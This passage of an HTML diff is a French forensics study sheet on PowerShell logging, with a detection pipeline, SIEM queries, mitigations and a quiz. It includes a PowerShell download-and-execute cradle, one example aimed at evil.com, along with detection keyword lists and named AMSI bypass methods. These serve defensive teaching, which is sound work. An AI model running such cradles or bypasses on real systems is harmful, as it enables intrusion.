+  <code style="display:block;background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin:.4rem 0;font-size:.74rem">IEX (New-Object Net.WebClient).DownloadString('http://&lt;C2&gt;/&lt;stage&gt;.ps1')</code>
+  Il signe quasiment tous les loaders (Lumma, RedLine, IcedID, Qakbot, LockBit affilié). Variantes : <code>iwr</code> (Invoke-WebRequest), <code>Invoke-RestMethod</code>, <code>Start-BitsTransfer</code>. Recherche SIEM minimale : <code>EID=4104 AND ScriptBlockText CONTAINS "DownloadString"</code>.
+</div>
+
+</div><!-- /tab-obf -->
+
+
+<!-- ══════════════════════════════════════════════
+     TAB 5 — DÉTECTION & OUTILS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-tools">
+
+<div class="concept-card">
+  <div class="concept-title">🔧 Pipeline de détection PowerShell</div>
+  La détection des PowerShell malveillants en 2026 repose sur trois couches : <strong>(1) collecte</strong> (ScriptBlock + Module + Transcription + Sysmon), <strong>(2) corrélation SIEM</strong> (Splunk/Elastic/Sentinel), <strong>(3) règles Sigma</strong> portables. Le tout enrichi par <strong>AMSI</strong> côté endpoint et <strong>EDR</strong> côté process.
+</div>
+
+<div class="sec-title">Outils &amp; commandes essentiels</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <div class="memo-card-title">🔍 Get-WinEvent (recherche live)</div>
+    <pre style="font-family:var(--mono);font-size:.7rem;line-height:1.5;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin:.3rem 0;white-space:pre-wrap"># Tous les EID 4104 avec niveau Warning
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' `
+  -FilterXPath '*[System[(EventID=4104) and (Level=3)]]'
+
+# Recherche pattern dans ScriptBlockText
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-PowerShell/Operational'
+  ID=4104
+} | Where-Object {$_.Message -match 'DownloadString|IEX|amsi'}</pre>
+  </div>
+  <div class="memo-card">
+    <div class="memo-card-title">⚡ EvtxECmd (Eric Zimmerman · offline)</div>
+    <pre style="font-family:var(--mono);font-size:.7rem;line-height:1.5;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin:.3rem 0;white-space:pre-wrap"># Parser tous les EVTX vers CSV
+EvtxECmd.exe -d C:\Logs\evtx `
+  --csv C:\out --csvf ps.csv `
+  --fc Microsoft-Windows-PowerShell
+
+# Maps spécifiques PowerShell dans
+# EvtxECmd\Maps\*.map (4104, 4103…)</pre>
+  </div>
+  <div class="memo-card">
+    <div class="memo-card-title">🛡 Sigma + Hayabusa (règles portables)</div>
+    <pre style="font-family:var(--mono);font-size:.7rem;line-height:1.5;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin:.3rem 0;white-space:pre-wrap"># Hayabusa (Yamato Security) :
+# moteur Sigma natif sur EVTX
+hayabusa.exe csv-timeline `
+  -d C:\Logs\evtx -o timeline.csv
+
+# 250+ règles ScriptBlock dans
+# github.com/SigmaHQ/sigma/.../powershell/</pre>
+  </div>
+  <div class="memo-card">
+    <div class="memo-card-title">🧬 Splunk SPL · KQL (Sentinel)</div>
+    <pre style="font-family:var(--mono);font-size:.7rem;line-height:1.5;color:var(--text);background:rgba(13,17,23,.5);padding:.5rem;border-radius:4px;margin:.3rem 0;white-space:pre-wrap"># Splunk
+index=windows EventCode=4104
+  Message="*DownloadString*"
+| stats count by host, user
+
+# KQL Microsoft Sentinel
+Event | where EventID == 4104
+  | where EventData has_any (
+    "IEX","DownloadString","amsi") </pre>
+  </div>
+</div>
+
+<div class="sec-title" style="margin-top:1.5rem">Triade détection : 4688 + 4104 + Sysmon EID 1</div>
+
+<div class="alert" style="background:rgba(0,229,204,.06);border-color:rgba(0,229,204,.4);margin:1rem 0">
+  ⚡ <strong>Le combo gagnant :</strong> en investigation, corréler systématiquement ces trois événements horodatés à la milliseconde près :
+  <ul style="margin:.4rem 0 0 1.5rem;font-size:.85rem">
+    <li><strong>EID 4688</strong> (Security) → ligne de commande <code>powershell.exe ...</code> + parent process</li>
+    <li><strong>Sysmon EID 1</strong> (Sysmon/Operational) → hash SHA-256 + chemin + GUID processus + lignée parent (PPID, GPP)</li>
+    <li><strong>EID 4104</strong> (PowerShell/Operational) → texte du script de-obfusqué</li>
+  </ul>
+  Reconstruction : Sysmon EID 1 donne <em>ce qui s'est lancé</em>, 4688 donne <em>la ligne de commande complète</em>, 4104 donne <em>ce qui a été exécuté</em>. Sans cette triade, l'analyse PowerShell est incomplète.
+</div>
+
+<div class="sec-title" style="margin-top:1.5rem">Mitigations recommandées (Microsoft + Mandiant + ANSSI)</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.84rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <th style="padding:.5rem;border:1px solid var(--border);text-align:left">Mesure</th>
+    <th style="padding:.5rem;border:1px solid var(--border);text-align:left">Effet</th>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>ScriptBlock Logging activé partout</strong> (GPO)</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Visibilité totale sur le code exécuté · faible overhead</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Désactiver PowerShell v2</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Empêche le downgrade attack qui contourne ScriptBlock + AMSI</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Constrained Language Mode</strong> via WDAC</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Bloque l'utilisation de .NET réflectif (<code>Add-Type</code>, <code>[Reflection.Assembly]</code>)</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>AppLocker / WDAC PowerShell rules</strong></td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Restriction par signature ou hash · bloque les .ps1 non signés</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>JEA</strong> (Just Enough Administration)</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Limite les cmdlets disponibles par rôle · sessions PS contraintes</td>
+  </tr>
+  <tr>
+    <td style="padding:.5rem;border:1px solid var(--border)"><strong>Forwarding centralisé</strong> (Winlogbeat/NXLog → SIEM)</td>
+    <td style="padding:.5rem;border:1px solid var(--border)">Empêche la suppression locale des EVTX par l'attaquant</td>
+  </tr>
+</table>
+
+</div><!-- /tab-tools -->
+
+
+<!-- ══════════════════════════════════════════════
+     QUIZ + EXAM TIP
+══════════════════════════════════════════════ -->
+<div class="page-wrap">
+
+<div class="exam-tip" style="margin-top:1.25rem">
+  <div class="exam-tip-title">🎓 Exam Tip — PowerShell forensique</div>
+  <p><strong>Canal principal</strong> : <code>Microsoft-Windows-PowerShell/Operational</code></p>
+  <p><strong>EID 4104 = ScriptBlock Logging</strong> — code <strong>de-obfusqué</strong> · artefact n°1</p>
+  <p><strong>EID 4103 = Module Logging</strong> — verbeux, pipelines, paramètres cmdlets</p>
+  <p><strong>EID 400 = Engine start</strong> — révèle PowerShell v2 (<code>HostVersion=2.0</code>)</p>
+  <p><strong>Activation</strong> : GPO ou registre <code>HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging=1</code></p>
+  <p><strong>AMSI</strong> = scan AV des script blocks après de-obfuscation · EID 1116/1117 (Defender)</p>
+  <p><strong>Bypass classiques</strong> : <code>amsiInitFailed</code> · patch <code>AmsiScanBuffer</code> · downgrade PS v2 · hook ETW</p>
+  <p><strong>Mitigation n°1</strong> : <code>Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root</code></p>
+  <p><strong>Patterns à alerter</strong> : <code>IEX</code> · <code>DownloadString</code> · <code>-Enc</code> · <code>amsiInitFailed</code> · <code>Invoke-Mimikatz</code> · <code>[Reflection.Assembly]::Load</code></p>
+  <p><strong>MITRE</strong> : T1059.001 (PowerShell) · T1027 (Obfuscated Files) · T1562.001 (Disable Tools / AMSI bypass)</p>
+  <p><strong>Triade IR</strong> : Sysmon EID 1 + Security EID 4688 + PS EID 4104 — corrélation horodatage</p>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Pourquoi l'EID 4104 est-il considéré comme « l'artefact n°1 » alors qu'un attaquant a utilisé <code>-EncodedCommand</code> ?</div>
+  <div class="quiz-meta">PowerShell forensique · Niveau : moyen</div>
+  <button class="quiz-reveal-btn">Révéler →</button>
+  <div class="quiz-answer">
+    Parce que ScriptBlock Logging <strong>capture le code après de-obfuscation par le moteur PowerShell</strong>, juste avant son exécution. Concrètement : un payload Base64 transmis via <code>powershell.exe -Enc SQBFAFg…</code> apparaîtra dans <code>EID 4688</code> (process creation) sous sa forme encodée, mais l'<code>EID 4104</code> contiendra dans <code>ScriptBlockText</code> le texte clair <em>tel qu'exécuté par le runtime</em> — par exemple <code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')</code>. Pas besoin de décoder soi-même. C'est aussi vrai pour les couches XOR, ROT13, compression, voire les obfuscations Invoke-Obfuscation : tout ce qui passe par le compilateur PS est journalisé en clair. Seules les exceptions : (1) PowerShell v2 (pas de 4104), (2) bypass AMSI/ETW qui coupent les logs à la source, (3) chargement réflectif de .NET (le binaire est exécuté hors compilation PS).
+  </div>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Lors d'une investigation, vous voyez Sysmon EID 1 montrant <code>powershell.exe -Version 2 ...</code> mais aucun EID 4104 correspondant dans <code>Microsoft-Windows-PowerShell/Operational</code>. Pourquoi ?</div>
+  <div class="quiz-meta">Downgrade attack · Niveau : facile</div>
+  <button class="quiz-reveal-btn">Révéler →</button>
+  <div class="quiz-answer">
+    C'est un <strong>downgrade attack</strong>. PowerShell 2.0 ne supporte ni ScriptBlock Logging (introduit en v5), ni Module Logging (v3+), ni AMSI (v5 + Win10). En forçant <code>-Version 2</code>, l'attaquant exécute son code dans un runtime <em>aveugle</em>. Le seul vestige possible est l'<strong>EID 400</strong> dans <code>Windows PowerShell.evtx</code> avec <code>HostVersion=2.0</code>, et la ligne de commande dans Security EID 4688 / Sysmon EID 1. Mitigation immédiate : désactiver la fonctionnalité optionnelle <code>MicrosoftWindowsPowerShellV2Root</code> (<code>Disable-WindowsOptionalFeature</code> ou via DISM). Cela retire l'engine v2 du système — à faire sur tout le parc, pas seulement les contrôleurs de domaine.
+  </div>
+</div>
+
+<div class="alert" style="margin:1.25rem 0">⚖️ <strong>Examen CAS-IN :</strong> EID 4104 = ScriptBlock (artefact principal, code de-obfusqué) · EID 4103 = Module (verbeux) · EID 400 = engine start (révèle v2) · canal <code>Microsoft-Windows-PowerShell/Operational</code> · activation par GPO ou registre <code>EnableScriptBlockLogging=1</code> · AMSI = scan AV après de-obfuscation · EID Defender 1116/1117 · downgrade PS v2 = bypass principal → désactiver v2 · MITRE T1059.001 · triade IR : Sysmon 1 + 4688 + 4104.</div>
+
+<div class="footer">
+  <span>CAS-IN Investigation Numérique · Forensique Suisse</span>
+  <span>Microsoft Docs · Mandiant M-Trends · Splunk Security · Magnet Forensics · SigmaHQ</span>
+</div>
+
+</div><!-- /page-wrap -->
+
+
+<script>
+// ── Tab switching ──
+function showTab(id, btn){
+  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('#ps-tabs .tab').forEach(function(t){t.classList.remove('active');});
+  var el=document.getElementById('tab-'+id);
+  if(el) el.classList.add('active');
+  if(btn) btn.classList.add('active');
+  window.scrollTo({top:Math.max(0,document.getElementById('ps-tabs').offsetTop-60),behavior:'smooth'});
+}
+
+// ── PowerShell log details ──
+var psLogDetails={
+  engine:{icon:'📋',title:'EID 400 / 403 — Engine state (par défaut)',body:`Logge le démarrage (400) et l'arrêt (403) du moteur PowerShell. <strong>Disponible sans activation</strong>.<br><br>
+    <strong>Champs clés</strong> : <code>HostName</code>, <code>HostVersion</code>, <code>EngineVersion</code>.<br>
+    <strong>Forensique</strong> : si <code>HostVersion=2.0</code> → <strong>downgrade attack</strong> (PS v2 n'a ni ScriptBlock Logging ni AMSI). Recherche immédiate dans <code>Windows PowerShell.evtx</code> (canal classique, pas Operational).`},
+  module:{icon:'📦',title:'EID 4103 — Module Logging (verbeux)',body:`Logge les <strong>détails d'exécution des pipelines</strong> : invocation de cmdlets, paramètres, variables, valeurs de retour. Disponible depuis PowerShell 3.0.<br><br>
+    <strong>Activation</strong> : GPO « Turn on Module Logging » + liste de modules (utiliser <code>*</code>).<br>
+    <strong>Volume</strong> : très élevé. <em>Invoke-Mimikatz seul génère 2 285 events 4103, ~7 Mo de logs</em> (Mandiant). Recommandé sur serveurs critiques uniquement.<br>
+    <strong>Forensique</strong> : capture des données que ScriptBlock manque (output formaté, valeurs intermédiaires) — utile en complément, pas en remplacement.`},
+  sb:{icon:'⭐',title:'EID 4104 — Script Block Logging (artefact n°1)',body:`Logge <strong>le texte complet de chaque script block exécuté</strong>, capturé <strong>après de-obfuscation</strong> par le moteur PowerShell. Disponible depuis PowerShell 5.0 / Windows 10.<br><br>
+    <strong>Activation</strong> : GPO « Turn on PowerShell Script Block Logging » ou registre <code>HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging=1</code>.<br>
+    <strong>Champ clé</strong> : <code>ScriptBlockText</code> (code clair) + <code>ScriptBlockId</code> (réassemblage).<br>
+    <strong>Niveau Warning (3)</strong> = PowerShell a <em>lui-même</em> flaggé le code comme suspect (heuristiques internes).<br>
+    <strong>Forensique</strong> : LE log DFIR à activer absolument. Capture même les payloads Base64, XOR, compression… après dé-obfuscation par le runtime.`},
+  trans:{icon:'📜',title:'Transcription — sessions complètes (in + out)',body:`Crée un <strong>fichier .txt par session PowerShell</strong> contenant tout l'input ET tout l'output (« comme regarder par-dessus l'épaule »).<br><br>
+    <strong>Activation</strong> : GPO « Turn on PowerShell Transcription » + chemin de sortie (idéalement partage réseau read-only).<br>
+    <strong>Localisation</strong> par défaut : <code>%USERPROFILE%\\Documents\\PowerShell_transcripts\\</code>.<br>
+    <strong>Forensique</strong> : capture les <strong>résultats</strong> que les autres logs n'ont pas (mots de passe en clair retournés par <code>Get-Credential</code>, sortie de <code>net user</code>, etc.). Aussi l'unique source pour reconstruire ce qu'un attaquant a vu pendant sa session.`}
+};
+
+function showPSLog(key){
+  var det=psLogDetails[key];
+  var box=document.getElementById('ps-detail');
+  if(!det||!box) return;
+  box.innerHTML='<div style="font-family:var(--sans);font-weight:700;font-size:.95rem;margin-bottom:.45rem;color:var(--cyan)">'+det.icon+' '+det.title+'</div><div style="line-height:1.6">'+det.body+'</div>';
+}
+</script>
+
+<!-- Notes utilisateur (CAS-IN v2.16) -->
+<script src="../js/components/fiche-notes.js" defer></script>
+<script src="../js/components/fiche-common.js" defer></script>
+    <script src="../js/components/fiche-reader.js" defer></script>
+<script src="../js/components/fiche-search.js" defer></script>
+<script src="../js/components/search-modal.js" defer></script>
+<script src="../js/components/fiche-related.js" defer></script>
+</body>
+</html>
